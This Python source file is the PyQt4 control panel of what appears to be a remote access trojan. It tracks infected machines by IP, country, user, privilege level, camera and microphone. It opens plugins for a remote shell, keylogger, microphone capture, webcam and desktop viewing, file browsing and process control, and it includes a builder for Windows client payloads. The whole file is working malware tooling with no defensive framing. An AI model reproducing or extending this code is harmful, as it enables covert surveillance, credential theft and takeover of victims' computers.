# -*- coding: utf-8 -*-

import sys
import socket
import os
import time
import ast
import zlib
import threading
import hashlib
import string
import random
import datetime
from PIL import Image
from threading import Thread

from PyQt4.QtGui import *
from PyQt4.QtCore import *

from libs import pygeoip
from libs.language import Translate
from ui import gui
from libs.alias import Alias
from libs.settings import Config, Settings
from libs.builder import Builder
from libs.modechat import get, send
from plugins.maudio import main as maudio
from plugins.mexplorer import main as mexplorer
from plugins.mshell import main as mshell
from plugins.mkeylogger import main as mkeylogger
from plugins.mprocesses import main as mprocesses
from plugins.mscript import main as mscript
from plugins.mdesktop import main as mdesktop
from plugins.mwebcam import main as mwebcam


# initial geo ip database
geo_ip_database = pygeoip.GeoIP('assets\\GeoIP.dat')

# initial assets directories
temp = os.path.join(os.getcwd(), 'temp\\')
if not os.path.exists(temp):
    os.makedirs(temp)
assets = os.path.join(os.getcwd(), 'assets\\')
flags = os.path.join(assets, 'flags')

# Multi Lang
translate = Translate()
_ = lambda _word: translate.word(_word)


def get_ip_location(ip):
    try:
        country_flag = os.path.join(flags, geo_ip_database.country_code_by_addr(ip).lower() + '.png')
        if os.path.exists(country_flag):
            return country_flag
        else:
            return os.path.join(flags, 'blank.png')
    except:
        return os.path.join(flags, 'blank.png')


def id_generator(size=16, chars=string.ascii_uppercase + string.digits):
    return ''.join(random.choice(chars) for _ in range(size))


class MainDialog(QMainWindow, gui.Ui_MainWindow):
    def __init__(self, parent=None):
        super(MainDialog, self).__init__(parent)
        self.setupUi(self)

        self.settings = Config()

        # set settings
        self.update_settings()

        # update gui
        self.gui = QApplication.processEvents

        self.portLabel.setText('[%s]' % str(self.PORT))
        self.ipv4Label.setText('[%s]' % str(self.IPADDRESS))

        # unlocked servers bank
        self.unlockedSockets = []

        # initial alias
        self.alias = Alias()

        # listen status
        self.acceptthreadState = False

        # plugins bank
        self.pluginsBank = {}
        self.current_sock = ''

        # disable panel buttons
        self.actionRemote_Shell.setDisabled(True)
        self.actionRemote_Explorer.setDisabled(True)
        self.actionRemote_Microphone.setDisabled(True)
        self.actionRemote_Keylogger.setDisabled(True)
        self.actionRemote_Process_Manager.setDisabled(True)
        self.actionRemote_Scripting.setDisabled(True)
        self.actionDesktop_Preview.setDisabled(True)
        self.actionWebcam_Preview.setDisabled(True)
        self.actionLock_Client.setDisabled(True)
        self.actionStop_Client.setDisabled(True)
        self.actionUnlock_Client.setDisabled(True)

        # indexes for servers table
        self.index_of_ipAddress = 0
        self.index_of_alias = 1
        self.index_of_socket = 2
        self.index_of_os = 3
        self.index_of_user = 4
        self.index_of_privs = 5
        self.index_of_lock = 6
        self.index_of_microphone = 7
        self.index_of_webcamera = 8
        self.index_of_activeWindowTitle = 9

        # initialize servers table columns width
        self.serversTable.setColumnWidth(self.index_of_ipAddress, 100)
        self.serversTable.setColumnWidth(self.index_of_alias, 60)
        self.serversTable.setColumnWidth(self.index_of_socket, 50)
        self.serversTable.setColumnWidth(self.index_of_os, 90)
        self.serversTable.setColumnWidth(self.index_of_user, 90)
        self.serversTable.setColumnWidth(self.index_of_privs, 110)
        self.serversTable.setColumnWidth(self.index_of_lock, 100)
        self.serversTable.setColumnWidth(self.index_of_microphone, 70)
        self.serversTable.setColumnWidth(self.index_of_webcamera, 45)

        # servers table double click trigger
        self.serversTable.doubleClicked.connect(self.unlock_client)
        # Initializing right click menu
        self.serversTable.setContextMenuPolicy(Qt.CustomContextMenu)
        self.connect(self.serversTable, SIGNAL('customContextMenuRequested(const QPoint&)'),
                     self.server_right_click_menu)

        #self.serversTable.clicked.connect(self.get_preview)

        # Triggers
        self.actionStartListen_for_connections.triggered.connect(self.connect_to_server)
        #self.actionStopListen_for_connections.triggered.connect(self.listen_stop)
        self.actionClient_Configuration.triggered.connect(self.run_settings)

        # Panel Triggers
        self.actionUnlock_Client.triggered.connect(self.unlock_client)
        self.actionLock_Client.triggered.connect(self.lock_client)
        self.actionStop_Client.triggered.connect(self.terminate_client)
        self.actionSet_Alias.triggered.connect(self.add_alias)
        self.actionRun_As_Admin.triggered.connect(self.run_as_admin)
        ###
        self.actionRemote_Shell.triggered.connect(lambda: self.run_plugin('shellMode'))
        self.actionRemote_Explorer.triggered.connect(lambda: self.run_plugin('explorerMode'))
        self.actionRemote_Microphone.triggered.connect(lambda: self.run_plugin('audioMode'))
        self.actionRemote_Keylogger.triggered.connect(lambda: self.run_plugin('keyloggerMode'))
        self.actionRemote_Scripting.triggered.connect(lambda: self.run_plugin('scriptingMode'))
        self.actionRemote_Process_Manager.triggered.connect(lambda: self.run_plugin('processesMode'))
        ###
        self.actionDesktop_Preview.triggered.connect(self.get_desktop_preview)
        self.actionWebcam_Preview.triggered.connect(self.get_webcam_preview)

        # builder trigger
        self.actionWindows_Client_PyInstaller.triggered.connect(self.run_builder)

        # Custom signal for update server table
        self.connect(self, SIGNAL('updateTable()'), self.update_servers_table)
        self.connect(self, SIGNAL('updatePanel()'), self.update_main_menu)
        self.connect(self, SIGNAL('executeShell()'), lambda: self.execute_plugin(plugin='shell'))
        self.connect(self, SIGNAL('executeExplorer()'), lambda: self.execute_plugin(plugin='explorer'))
        self.connect(self, SIGNAL('executeAudio()'), lambda: self.execute_plugin(plugin='audio'))
        self.connect(self, SIGNAL('executeKeylogger()'), lambda: self.execute_plugin(plugin='keylogger'))
        self.connect(self, SIGNAL('executeScripting()'), lambda: self.execute_plugin(plugin='scripting'))
        self.connect(self, SIGNAL('executeProcesses()'), lambda: self.execute_plugin(plugin='processes'))

        self.set_language()

    def set_language(self):

        # MAIN
        self.setWindowTitle(_('TITLE'))

        # HEADERS
        self.serversTable.horizontalHeaderItem(0).setText(_('HEADER_IP_ADDRESS'))
        self.serversTable.horizontalHeaderItem(1).setText(_('HEADER_ALIAS'))
        self.serversTable.horizontalHeaderItem(2).setText(_('HEADER_SOCKET'))
        self.serversTable.horizontalHeaderItem(3).setText(_('HEADER_OS'))
        self.serversTable.horizontalHeaderItem(4).setText(_('HEADER_USER'))
        self.serversTable.horizontalHeaderItem(5).setText(_('HEADER_PRIVS'))
        self.serversTable.horizontalHeaderItem(6).setText(_('HEADER_LOCK'))
        self.serversTable.horizontalHeaderItem(7).setText(_('HEADER_MIC'))
        self.serversTable.horizontalHeaderItem(8).setText(_('HEADER_CAM'))
        self.serversTable.horizontalHeaderItem(9).setText(_('HEADER_ACTIVE_WINDOW_TITLE'))
        # END HEADERS

        # BOTTOM
        self.clientStatusLabel.setText(_('BOTTOM_STATUS'))
        self.ipv4TextLabel.setText(_('BOTTOM_IPV4'))
        self.portTextLabel.setText(_('BOTTOM_PORT'))
        self.serversOnlineStatus.setText(_('BOTTOM_SERVERS_TOTAL'))
        # END BOTTOM

        # MENU
        self.serverMenu.setTitle(_('MENU_SERVER'))
        self.actionStartListen_for_connections.setText(_('MENU_SERVER_START'))
        self.actionStopListen_for_connections.setText(_('MENU_SERVER_STOP'))
        self.actionClient_Configuration.setText(_('MENU_SERVER_CONFIGURATION'))
        self.menuServer.setTitle(_('MENU_CLIENT'))
        self.actionUnlock_Client.setText(_('MENU_CLIENT_UNLOCK'))
        self.actionLock_Client.setText(_('MENU_CLIENT_LOCK'))
        self.actionStop_Client.setText(_('MENU_CLIENT_STOP'))
        self.actionSet_Alias.setText(_('MENU_CLIENT_SET_ALIAS'))
        self.actionRun_As_Admin.setText(_('MENU_CLIENT_RUN_AS_ADMIN'))
        # END MENU

        # PLUGINS
        self.menuAction.setTitle(_('MENU_PLUGIN'))
        self.actionRemote_Shell.setText(_('MENU_PLUGIN_SHELL'))
        self.actionRemote_Explorer.setText(_('MENU_PLUGIN_EXPLORER'))
        self.actionRemote_Microphone.setText(_('MENU_PLUGIN_MICROPHONE'))
        self.actionRemote_Process_Manager.setText(_('MENU_PLUGIN_PROCESSES'))
        self.actionRemote_Keylogger.setText(_('MENU_PLUGIN_KEYLOGGER'))
        self.actionRemote_Scripting.setText(_('MENU_PLUGIN_SCRIPTING'))
        self.actionDesktop_Preview.setText(_('MENU_PLUGIN_DESKTOP'))
        self.actionWebcam_Preview.setText(_('MENU_PLUGIN_WEBCAM'))
        # END PLUGINS

        # BUILDER
        self.menuBuilder.setTitle(_('MENU_BUILDER'))
        self.actionWindows_Client_PyInstaller.setText(_('MENU_BUILDER_PYINSTALLER'))
        # END BUILDER

    def connect_to_server(self):
        self.connection_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        try:
            session_id = id_generator(size=24)
            self.connection_socket.connect((self.IPADDRESS, self.PORT))
            auth_status = get(self.connection_socket, 'auth admin 1234', session_id)
            if auth_status == 'LoginSuccess':
                self.servers_checker_thread = threading.Thread(target=self.check_servers, args=(session_id,))
                self.servers_checker_thread.start()
            elif auth_status == 'LoginError':
                return
        except socket.error:
            return

    def check_servers(self, session_id):
        self.checker_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.checker_socket.connect((self.IPADDRESS, self.PORT))
        status = get(self.checker_socket, 'initSession', session_id)
        if status == 'sessionSuccess':
            pass
        elif status == 'sessionError':
            return
        while 1:
            try:
                data = get(self.checker_socket, 'getClients', 'getClients')
                self.streaming_socks = ast.literal_eval(data)
                self.emit(SIGNAL('updateTable()'))
                time.sleep(3)
            except socket.error:
                continue
            except SyntaxError:
                continue

    def get_preview(self):
        client = self.current_client()
        if client:
            try:
                screen_dict = get(self.streaming_socks[client]['sock'], 'getScreen', 'screenshot')
                screen_info = ast.literal_eval(screen_dict)
                im = Image.frombuffer('RGB', (int(screen_info['width']), int(screen_info['height'])),
                                      zlib.decompress(screen_info['screenshotbits']), 'raw', 'BGRX', 0, 1)
                screen_bits = im.convert('RGBA')
                screen_bits.save(os.path.join(temp, 'bg.png'), 'png')
                self.set_bg_preview(client)
            except SyntaxError:
                pass

    def set_bg_preview(self, client):
        self.serversTable.setToolTip(
            '<p align="center" style="background-color: #2c3e50;color: #c9f5f7;">%s\'s Preview<br><img src="%s" width="400"></p>' % (
                self.socks[client]['ip_address'], os.path.join(temp, 'bg.png')))

    def get_desktop_preview(self):
        client = self.current_client()
        if client:
            args = {
                'sock': self.connection_socket,
                'socket': self.streaming_socks[client]['socket'],
                'ipAddress': self.streaming_socks[client]['ip_address'],
                'assets': assets,
            }
            self.desktop_desktop_preview = mdesktop.mainPopup(args)
            self.desktop_desktop_preview.show()

    def get_webcam_preview(self):
        client = self.current_client()
        if client:
            args = {
                'sock': self.socks[client]['sock'],
                'socket': self.socks[client]['socket'],
                'ipAddress': self.socks[client]['ip_address'],
                'assets': assets,
            }
            self.camera_preview_dialog = mwebcam.mainPopup(args)
            self.camera_preview_dialog.show()

    # Update Servers Table from self.socks
    def update_servers_table(self):

        online_clients = {}
        offline_clients = {}

        self.serversTable.clearContents()
        self.offlineServersTable.clearContents()

        # Split Clients#
        for index, key in enumerate(self.streaming_socks):
            if self.streaming_socks[key]['status']:
                online_clients[index] = self.streaming_socks[key]
            else:
                offline_clients[index] = self.streaming_socks[key]

        self.serversTable.setRowCount(len(online_clients))
        try:
            for index, obj in enumerate(online_clients):

                # add ip address & county flag
                ip_address = online_clients[obj]['ip_address']
                item = QTableWidgetItem(ip_address)
                item.setIcon(QIcon(get_ip_location(ip_address)))
                self.serversTable.setItem(index, self.index_of_ipAddress, item)

                # add alias if aviable
                alias = self.alias.get_alias(online_clients[obj]['ip_address'], online_clients[obj]['os'])
                item = QTableWidgetItem(alias)
                self.serversTable.setItem(index, self.index_of_alias, item)

                # add socket number
                socket_value = str(online_clients[obj]['socket'])
                item = QTableWidgetItem(socket_value)
                if socket_value == 'OFFLINE':
                    item.setFlags( Qt.ItemIsSelectable |  Qt.ItemIsEnabled )
                item.setTextAlignment(Qt.AlignCenter | Qt.AlignVCenter)
                self.serversTable.setItem(index, self.index_of_socket, item)

                # add os version
                item = QTableWidgetItem(online_clients[obj]['os'])
                item.setIcon(QIcon(os.path.join(assets, 'windows.png')))
                self.serversTable.setItem(index, self.index_of_os, item)

                # add server user
                item = QTableWidgetItem(online_clients[obj]['user'])
                item.setTextAlignment(Qt.AlignCenter | Qt.AlignVCenter)
                self.serversTable.setItem(index, self.index_of_user, item)

                # add user privileges
                try:
                    privs_status = _('INFO_USER') if not online_clients[obj]['privileges'] == '1' else _(
                        'INFO_ADMIN')
                except KeyError:
                    print online_clients[obj]
                item = QTableWidgetItem()
                if privs_status == _('INFO_ADMIN'):
                    item.setIcon(QIcon(os.path.join(assets, 'admin.png')))
                else:
                    item.setIcon(QIcon(os.path.join(assets, 'user.png')))
                item.setText(privs_status)
                self.serversTable.setItem(index, self.index_of_privs, item)

                # add server lock status
                lock_status = _('INFO_LOCKED') if online_clients[obj]['protection'] == 'False' else _(
                    'INFO_UNLOCKED')
                item = QTableWidgetItem(lock_status)
                if lock_status == _('INFO_LOCKED'):
                    item.setTextColor(QColor('#e67e22'))
                    item.setIcon(QIcon(os.path.join(assets, 'lock.png')))
                else:
                    item.setTextColor(QColor('#2ecc71'))
                    item.setIcon(QIcon(os.path.join(assets, 'unlock.png')))
                self.serversTable.setItem(index, self.index_of_lock, item)

                # add input device
                item = QTableWidgetItem()
                if online_clients[obj]['inputdevice'] == 'NoDevice':
                    item.setIcon(QIcon(os.path.join(assets, 'mic_no.png')))
                    item.setText(_('INFO_NO'))
                else:
                    item.setIcon(QIcon(os.path.join(assets, 'mic_yes.png')))
                    item.setText(_('INFO_YES'))
                self.serversTable.setItem(index, self.index_of_microphone, item)

                # add webcam device
                item = QTableWidgetItem()
                if online_clients[obj]['webcamdevice'] == 'NoDevice':
                    item.setIcon(QIcon(os.path.join(assets, 'web_camera_no.png')))
                    item.setText(_('INFO_NO'))
                else:
                    item.setIcon(QIcon(os.path.join(assets, 'web_camera.png')))
                    item.setText(_('INFO_YES'))
                self.serversTable.setItem(index, self.index_of_webcamera, item)

                # add active windows title
                item = QTableWidgetItem(online_clients[obj]['activewindowtitle'])
                item.setTextAlignment(Qt.AlignRight | Qt.AlignVCenter)
                item.setTextColor(QColor('#1abc9c'))
                self.serversTable.setItem(index, self.index_of_activeWindowTitle, item)
        except RuntimeError:
            pass

        self.offlineServersTable.setRowCount(len(offline_clients))
        try:
            for index, obj in enumerate(offline_clients):

                # add active windows title
                item = QTableWidgetItem(offline_clients[obj]['alias'])
                item.setTextAlignment(Qt.AlignLeft | Qt.AlignVCenter)
                #item.setTextColor(QColor('#1abc9c'))
                self.offlineServersTable.setItem(index, 0, item)# add active windows title

                item = QTableWidgetItem(offline_clients[obj]['ip_address'])
                item.setTextAlignment(Qt.AlignLeft | Qt.AlignVCenter)
                #item.setTextColor(QColor('#1abc9c'))
                self.offlineServersTable.setItem(index, 1, item)# add active windows title

                item = QTableWidgetItem(offline_clients[obj]['last_online'])
                item.setTextAlignment(Qt.AlignRight | Qt.AlignVCenter)
                #item.setTextColor(QColor('#1abc9c'))
                self.offlineServersTable.setItem(index, 2, item)

        except RuntimeError:
            pass

        # update servers online counter
        self.onlineStatus.setText(str(len(online_clients)))



    def unlock_client(self):
        while 1:
            if self.serversTable.item(self.serversTable.currentRow(), self.index_of_lock).text() == _('INFO_LOCKED'):
                client = self.current_client()
                if client:
                    text, ok = QInputDialog.getText(self, _('UNLOCK_CLIENT'), _('ENTER_PASSWORD'), QLineEdit.Password)
                    if ok:
                        _hash = hashlib.md5()
                        try:
                            _hash.update(str(text))
                            answer = get(self.connection_socket, _hash.hexdigest(), client)
                            if 'iamactive' in answer:
                                break
                        except UnicodeEncodeError:
                            pass

                    else:
                        break
            else:
                break

    def lock_client(self):
        client = self.current_client()
        if client:
            send(self.connection_socket, 'lock', client)

    def update_main_menu(self):
        try:
            if self.serversTable.item(self.serversTable.currentRow(), self.index_of_lock).text() == _('INFO_LOCKED'):
                self.actionUnlock_Client.setDisabled(False)
                self.actionSet_Alias.setDisabled(False)
                self.actionRun_As_Admin.setDisabled(False)
                self.actionDesktop_Preview.setDisabled(False)
                server = self.current_client()
                if self.socks[server]['webcamdevice'] != 'NoDevice':
                    self.actionWebcam_Preview.setDisabled(False)
                self.actionRemote_Shell.setDisabled(True)
                self.actionRemote_Explorer.setDisabled(True)
                self.actionRemote_Microphone.setDisabled(True)
                self.actionRemote_Keylogger.setDisabled(True)
                self.actionRemote_Scripting.setDisabled(True)
                self.actionRemote_Process_Manager.setDisabled(True)
                self.actionLock_Client.setDisabled(True)
                self.actionStop_Client.setDisabled(True)
            else:
                self.actionRemote_Shell.setDisabled(False)
                self.actionRemote_Explorer.setDisabled(False)
                if self.has_microphone():
                    self.actionRemote_Microphone.setDisabled(False)
                self.actionRemote_Keylogger.setDisabled(False)
                self.actionRemote_Scripting.setDisabled(False)
                self.actionRemote_Process_Manager.setDisabled(False)
                self.actionLock_Client.setDisabled(False)
                self.actionStop_Client.setDisabled(False)
                self.actionUnlock_Client.setDisabled(True)
                self.actionSet_Alias.setDisabled(False)
                self.actionRun_As_Admin.setDisabled(False)
                self.actionDesktop_Preview.setDisabled(False)
                server = self.current_client()
                if self.socks[server]['webcamdevice'] != 'NoDevice':
                    self.actionWebcam_Preview.setDisabled(False)
        except:
            self.actionRemote_Shell.setDisabled(True)
            self.actionRemote_Explorer.setDisabled(True)
            self.actionRemote_Keylogger.setDisabled(True)
            self.actionRemote_Microphone.setDisabled(True)
            self.actionRemote_Scripting.setDisabled(True)
            self.actionRemote_Process_Manager.setDisabled(True)
            self.actionLock_Client.setDisabled(True)
            self.actionStop_Client.setDisabled(True)
            self.actionSet_Alias.setDisabled(True)
            self.actionRun_As_Admin.setDisabled(True)
            self.actionUnlock_Client.setDisabled(True)
            self.actionDesktop_Preview.setDisabled(True)
            self.actionWebcam_Preview.setDisabled(True)

    def has_microphone(self):
        client = self.current_client()
        if client:
            if self.streaming_socks[client]['inputdevice'] != 'NoDevice':
                return True
            else:
                return False

    def has_camera(self):
        client = self.current_client()
        if self.streaming_socks[client]['webcamdevice'] != 'NoDevice':
            return True
        else:
            return False

    def server_right_click_menu(self, point):
        server_index = self.serversTable.currentRow()
        server_menu = QMenu(self)
        server_options_menu = QMenu(_('RM_CLIENT_OPTIONS'), self)
        server_options_menu.setIcon(QIcon(os.path.join(assets, 'settings.png')))

        if self.serversTable.selectedItems():

            server_menu.addAction(QIcon(os.path.join(assets, 'add_alias.png')), _('RM_SET_ALIAS'), self.add_alias)
            server_menu.addAction(QIcon(os.path.join(assets, 'run_as_admin.png')), _('RM_RUN_AS_ADMIN'),
                                  self.run_as_admin)
            server_menu.addSeparator()

            if self.serversTable.item(server_index, self.index_of_lock).text() == _('INFO_UNLOCKED'):
                server_menu.addAction(QIcon(os.path.join(assets, 'mshell.png')), _('RM_SHELL'),
                                      lambda: self.run_plugin('shellMode'))
                server_menu.addAction(QIcon(os.path.join(assets, 'mexplorer.png')), _('RM_EXPLORER'),
                                      lambda: self.run_plugin('explorerMode'))
                server_menu.addAction(QIcon(os.path.join(assets, 'mprocesses.png')), _('RM_PROCESSES'),
                                      lambda: self.run_plugin('processesMode'))
                audio_menu = server_menu.addAction(QIcon(os.path.join(assets, 'maudio.png')), _('RM_MICROPHONE'),
                                                   lambda: self.run_plugin('audioMode'))
                if not self.has_microphone():
                    audio_menu.setEnabled(False)
                server_menu.addAction(QIcon(os.path.join(assets, 'script.png')), _('RM_SCRIPTING'),
                                      lambda: self.run_plugin('scriptingMode'))
                server_menu.addAction(QIcon(os.path.join(assets, 'mkeylogger.png')), _('RM_KEYLOGGER'),
                                      lambda: self.run_plugin('keyloggerMode'))

                server_menu.addSeparator()
                server_menu.addMenu(server_options_menu)
                server_options_menu.addAction(QIcon(os.path.join(assets, 'lock.png')), _('RM_LOCK'),
                                              self.lock_client)
                server_options_menu.addAction(QIcon(os.path.join(assets, 'stop.png')), _('RM_TERMINATE'),
                                              self.terminate_client)
            else:
                server_menu.addAction(QIcon(os.path.join(assets, 'unlock.png')), _('RM_UNLOCK'), self.unlock_client)

            server_menu.addSeparator()

            server_menu.addAction(QIcon(os.path.join(assets, 'mdesktop.png')),
                                  _('RM_DESKTOP'), self.get_desktop_preview)
            camera_menu = server_menu.addAction(QIcon(os.path.join(assets, 'webcam.png')),
                                                _('RM_CAMERA'), self.get_webcam_preview)
            if not self.has_camera():
                camera_menu.setEnabled(False)

            server_menu.exec_(self.serversTable.mapToGlobal(point))

    # get item
    def current_client(self):
        try:
            return int(self.serversTable.item(self.serversTable.currentRow(), self.index_of_socket).text())
        except AttributeError:
            return False

    def send_run_signal(self, sock, signal):
        signals = {
            'shellMode': 'executeShell()',
            'explorerMode': 'executeExplorer()',
            'audioMode': 'executeAudio()',
            'keyloggerMode': 'executeKeylogger()',
            'scriptingMode': 'executeScripting()',
            'processesMode': 'executeProcesses()',
        }
        if signal in signals:
            self.current_sock = sock
            self.emit(SIGNAL(signals[signal]))

    def execute_plugin(self, plugin):
        plugins = {
            'shell': mshell,
            'explorer': mexplorer,
            'audio': maudio,
            'keylogger': mkeylogger,
            'scripting': mscript,
            'processes': mprocesses,
        }

        server = self.current_client()
        if server:
            args = {
                'sock': self.current_sock,
                'socket': self.socks[server]['socket'],
                'ipAddress': self.socks[server]['ip_address'],
                'assets': assets,
            }
            plugin_id = id_generator()
            if plugin in plugins:
                self.pluginsBank[plugin_id] = plugins[plugin].mainPopup(args)
                self.pluginsBank[plugin_id].show()

    def add_alias(self):
        client = self.current_client()
        if client:
            text, ok = QInputDialog.getText(self, _('ALIAS_SET'), _('ALIAS_NAME'))
            if ok:
                self.alias.set_alias(self.streaming_socks[client]['ip_address'], self.streaming_socks[client]['os'], text)

    def run_as_admin(self):
        client = self.current_client()
        if client:
            get(self.connection_socket, 'runasadmin', client)

    def terminate_client(self):
        server = self.current_client()
        if server:
            warn = QMessageBox(QMessageBox.Question, _('TERMINATE_CONFIRM'), _('TERMINATE_TEXT'))
            warn.setStandardButtons(QMessageBox.Yes | QMessageBox.No)
            ans = warn.exec_()
            if ans == QMessageBox.Yes:
                send(self.socks[server]['sock'], 'terminateServer', 'terminateserver')

    def run_plugin(self, mode):
        client = self.current_client()
        if client:
            get(client, 'startChildSocket %s' % client, mode)

    def update_settings(self):
        self.settings = Config()
        self.IPADDRESS = self.settings.ip_address
        self.PORT = self.settings.port
        self.MAXCONNECTIONS = self.settings.max_connections
        self.TIMEOUT = self.settings.timeout
        self.LANGUAGE = self.settings.language

    def run_settings(self):
        args = {
            'language': self.LANGUAGE
        }
        self.settings_form = Settings(args)
        self.settings_form.show()

    def run_builder(self):
        args = {
            'language': self.LANGUAGE
        }
        self.builder_form = Builder(args)
        self.builder_form.show()

    def closeEvent(self, event):
        sys.exit(1)

# Run Application
if __name__ == '__main__':
    app = QApplication(sys.argv)
    form = MainDialog()

    form.show()

    sys.exit(app.exec_())
